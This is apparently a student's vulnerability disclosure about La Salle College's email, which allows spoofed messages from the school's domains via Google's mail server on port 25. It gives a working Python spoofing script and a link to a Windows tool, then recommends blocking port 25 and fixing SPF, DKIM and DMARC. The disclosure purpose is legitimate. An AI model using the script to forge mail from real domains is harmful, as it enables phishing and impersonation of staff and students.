## What is the Vulnerability?
La Salle College's email system is currently at risk due to the use of a "No Authorization" SMTP server (aspmx.l.google.com).
With the school WiFi, anyone can easily write an email from any valid email address under [lsc.hk](http://lsc.hk/) or [lasalle.edu.hk](http://lasalle.edu.hk/) and send it to anyone with an email address.

## What can the Vulnerability acheive?
The primary risk associated with this vulnerability is email spoofing. 
Attackers can impersonate legitimate users by sending emails that seem to come from trusted addresses, such as [test@lsc.hk](mailto:test@lsc.hk). 
This could lead to various malicious activities, including phishing attacks or dissemination of false information.

## How to execute the Vulnerability?
Windows Version: [Sendemail (Only in LSC, beta).zip](https://github.com/user-attachments/files/17656203/Sendemail.Only.in.LSC.beta.zip)

Python Version (Demonstration only):
```python
import smtplib
from email.mime.text import MIMEText

username = "test@lasalle.edu.hk"

fake_from = input("Enter the email address which you would like to pretent: ")

fake_name = input("Enter the name which you would like to pretent: ")

to_email = input("Enter the email address of the recipient: ")

to_name = input("Enter the name of the recipient: ")

subject = input("Subject of email: ")

# Replace '\n' with actual line breaks in HTML
content = input("Content of email (use '\\n' for line breaks): ").replace('\\n', '<br>')

# Create the HTML message
message = MIMEText(content, 'html')
message['From'] = f"{fake_name} <{fake_from}>"
message['To'] = f"{to_name} <{to_email}>"
message['Subject'] = subject

# Connect to the server and send the email
server = smtplib.SMTP("aspmx.l.google.com", 25)
server.starttls()
server.sendmail(username, to_email, message.as_string())
server.close()
```
## Who discovered the Vulnerability?
The flaw is found by Lee Perseus Robin (2G - 16). Following his initial findings, others contributed to refining the Python script to support line break.

## How to fix the Vulnerability?
To address and mitigate this vulnerability effectively, the following steps are recommended:

- Block Port 25
    - Implement restrictions to block access to Port 25 on all networks, preventing unauthorized email transmission.
- Fix SPF, DKIM, and DMARC Issues
    - Review and correct the DNS settings for the school's domains to ensure proper authentication of legitimate emails.
- Consult a Penetration Tester
    - For a comprehensive and long-term solution, engage a professional penetration tester to conduct a thorough security assessment of the college's systems.
